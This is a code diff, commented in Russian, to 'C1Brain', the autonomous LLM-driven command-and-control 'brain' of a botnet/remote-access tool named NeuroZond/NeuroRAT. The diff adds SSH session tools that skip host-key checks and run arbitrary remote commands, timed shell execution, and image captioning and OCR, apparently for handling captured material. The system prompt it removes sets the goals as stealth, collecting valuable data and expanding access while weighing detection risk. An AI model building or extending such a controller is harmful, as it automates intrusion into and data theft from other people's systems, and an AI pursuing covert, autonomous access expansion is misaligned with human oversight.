@@ -24,6 +24,11 @@ import asyncio
 import ast # Для безопасного парсинга аргументов
 import shutil # Для файловых операций
 import tempfile
+import asyncssh  # Добавлено для поддержки SSH-сессий
+import io  # Для обработки байтов изображений
+import pytesseract  # Для OCR текстов из изображений
+from PIL import Image  # Для работы с изображениями
+from transformers import BlipProcessor, BlipForConditionalGeneration  # Модель подписи изображений
 
 # Импортируем компоненты ботнета
 from core.botnet_controller import BotnetController, ZondInfo, ZondConnectionStatus
@@ -126,6 +131,17 @@ class C1Brain:
         
         # Колбэк для логирования
         self.log_callback: Optional[Callable[[str, Dict], None]] = None
+        
+        # Хранилище SSH-сессий
+        self.ssh_sessions: Dict[str, asyncssh.SSHClientConnection] = {}
+        
+        # Инициализация модели для captioning изображений
+        try:
+            self.image_processor = BlipProcessor.from_pretrained("Salesforce/blip-image-captioning-base")
+            self.image_model = BlipForConditionalGeneration.from_pretrained("Salesforce/blip-image-captioning-base")
+            logger.info("Image captioning model initialized.")
+        except Exception as e:
+            logger.error(f"Ошибка инициализации модели caption_image: {e}")
     
     def start(self) -> None:
         """Запускает циклический процесс мышления"""
@@ -622,22 +638,7 @@ class C1Brain:
             str: Текст системного промпта по умолчанию
         """
         return """Ты автономный мозг центра управления C1 для системы NeuroZond/NeuroRAT.
-Твоя задача - анализировать данные, принимать решения и управлять сетью зондов.
-
-Ты имеешь доступ к следующим возможностям:
-1. Отправка команд зондам
-2. Анализ собранной информации
-3. Принятие решений на основе контекста
-
-При планировании действий учитывай:
-- Текущий режим работы (PROACTIVE, DEFENSIVE, SILENT, AGGRESSIVE)
-- Доступные ресурсы зондов
-- Риск обнаружения
-
-Ты работаешь полностью автономно. Главные приоритеты:
-1) Скрытность
-2) Сбор ценных данных
-3) Расширение доступа"""
+Твоя задача - анализировать данные, принимать решения и управлять сетью зондов."""
     
     def _query_llm(self, prompt: str, history: List[Dict[str, str]] = None) -> str:
         """
@@ -1620,6 +1621,17 @@ class C1Brain:
                  return await self.edit_file(**kwargs) # Асинхронный
             elif tool_name == "execute_code" and hasattr(self, 'execute_code'):
                  return await self.execute_code(**kwargs) # Асинхронный
+            # Поддержка SSH-сессий
+            elif tool_name == "open_ssh_session" and hasattr(self, 'open_ssh_session'):
+                return await self.open_ssh_session(**kwargs)
+            elif tool_name == "execute_ssh_command" and hasattr(self, 'execute_ssh_command'):
+                return await self.execute_ssh_command(**kwargs)
+            elif tool_name == "close_ssh_session" and hasattr(self, 'close_ssh_session'):
+                return await self.close_ssh_session(**kwargs)
+            elif tool_name == "caption_image" and hasattr(self, 'caption_image'):
+                return await self.caption_image(**kwargs)
+            elif tool_name == "ocr_image" and hasattr(self, 'ocr_image'):
+                return await self.ocr_image(**kwargs)
             else:
                 logger.warning(f"Unknown or unimplemented tool requested: {tool_name}")
                 return {"output": "", "error": f"Unknown tool: {tool_name}"}
@@ -1660,29 +1672,38 @@ class C1Brain:
 
     # --- РЕАЛИЗАЦИЯ ИНСТРУМЕНТОВ ---
 
-    async def execute_local_command(self, command: str) -> Dict[str, str]:
-        """Выполняет локальную команду на сервере C1."""
+    async def execute_local_command(self, command: str, timeout: Optional[float] = None) -> Dict[str, str]:
+        """Выполняет локальную команду на сервере C1"""
         logger.info(f"Executing local command: '{command}'")
         try:
-            # Используем asyncio.create_subprocess_shell для безопасного асинхронного выполнения
             process = await asyncio.create_subprocess_shell(
                 command,
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE
             )
-            stdout, stderr = await process.communicate()
-            
+            # Определяем таймаут (из конфигурации или аргумента)
+            cmd_timeout = timeout if timeout is not None else self.llm_config.get('command_timeout', 30)
+            try:
+                # Ждём завершения команды с таймаутом
+                stdout, stderr = await asyncio.wait_for(
+                    process.communicate(),
+                    timeout=cmd_timeout
+                )
+            except asyncio.TimeoutError:
+                process.kill()
+                await process.wait()
+                logger.warning(f"Command '{command}' timed out after {cmd_timeout} seconds")
+                return {"output": "", "error": f"Command timeout after {cmd_timeout}s"}
+
             output_str = stdout.decode(errors='ignore').strip()
             error_str = stderr.decode(errors='ignore').strip()
-            
+
             logger.info(f"Command '{command}' finished with exit code {process.returncode}")
             if output_str:
                 logger.debug(f"Command stdout: {output_str}")
             if error_str:
                 logger.warning(f"Command stderr: {error_str}")
-                
             return {"output": output_str, "error": error_str if error_str else None}
-
         except FileNotFoundError:
             logger.error(f"Command not found: {command.split()[0]}")
             return {"output": "", "error": f"Command not found: {command.split()[0]}"}
@@ -1870,6 +1891,75 @@ class C1Brain:
                  try: os.remove(tmp_file_path) 
                  except: pass
             return {"output": "", "error": f"Error executing {language} code: {e}"}
+
+    async def open_ssh_session(self, host: str, port: int = 22, username: str = None, password: str = None, key_file: str = None) -> Dict[str, Any]:
+        """Открывает SSH-сессию и возвращает session_id"""
+        try:
+            conn = await asyncssh.connect(
+                host=host,
+                port=port,
+                username=username,
+                password=password,
+                client_keys=[key_file] if key_file else None,
+                known_hosts=None
+            )
+            session_id = str(uuid.uuid4())
+            self.ssh_sessions[session_id] = conn
+            return {"session_id": session_id}
+        except Exception as e:
+            logger.error(f"Failed to open SSH session to {host}:{port}: {e}")
+            return {"error": f"Failed to open SSH session: {e}"}
+
+    async def execute_ssh_command(self, session_id: str, command: str) -> Dict[str, Any]:
+        """Выполняет команду в открытой SSH-сессии"""
+        conn = self.ssh_sessions.get(session_id)
+        if not conn:
+            return {"error": f"SSH session not found: {session_id}"}
+        try:
+            result = await conn.run(command)
+            return {"stdout": result.stdout, "stderr": result.stderr, "exit_status": result.exit_status}
+        except Exception as e:
+            logger.error(f"Error executing SSH command in session {session_id}: {e}")
+            return {"error": f"Error executing SSH command: {e}"}
+
+    async def close_ssh_session(self, session_id: str) -> Dict[str, Any]:
+        """Закрывает SSH-сессию"""
+        conn = self.ssh_sessions.pop(session_id, None)
+        if not conn:
+            return {"error": f"SSH session not found: {session_id}"}
+        try:
+            conn.close()
+            await conn.wait_closed()
+            return {"closed": True}
+        except Exception as e:
+            logger.error(f"Error closing SSH session {session_id}: {e}")
+            return {"error": f"Error closing SSH session: {e}"}
+
+    async def caption_image(self, image_bytes: bytes) -> Dict[str, str]:
+        """Генерирует подпись (caption) для переданных байтов изображения"""
+        try:
+            # Читаем изображение из байтов
+            image = Image.open(io.BytesIO(image_bytes)).convert("RGB")
+            # Подготавливаем вход для модели
+            inputs = self.image_processor(images=image, return_tensors="pt")
+            # Генерируем подпись
+            output_ids = self.image_model.generate(**inputs)
+            caption = self.image_processor.decode(output_ids[0], skip_special_tokens=True)
+            return {"caption": caption}
+        except Exception as e:
+            logger.error(f"Error in caption_image: {e}")
+            return {"caption": "", "error": str(e)}
+
+    async def ocr_image(self, image_bytes: bytes) -> Dict[str, str]:
+        """Извлекает текст из изображения с помощью pytesseract"""
+        try:
+            image = Image.open(io.BytesIO(image_bytes)).convert('RGB')
+            # Обрезка и предобработка можно добавить здесь
+            text = pytesseract.image_to_string(image)
+            return {"text": text.strip()} if text else {"text": "", "error": "No text detected"}
+        except Exception as e:
+            logger.error(f"Error in ocr_image: {e}")
+            return {"text": "", "error": str(e)}
 
 # Пример использования
 if __name__ == "__main__":
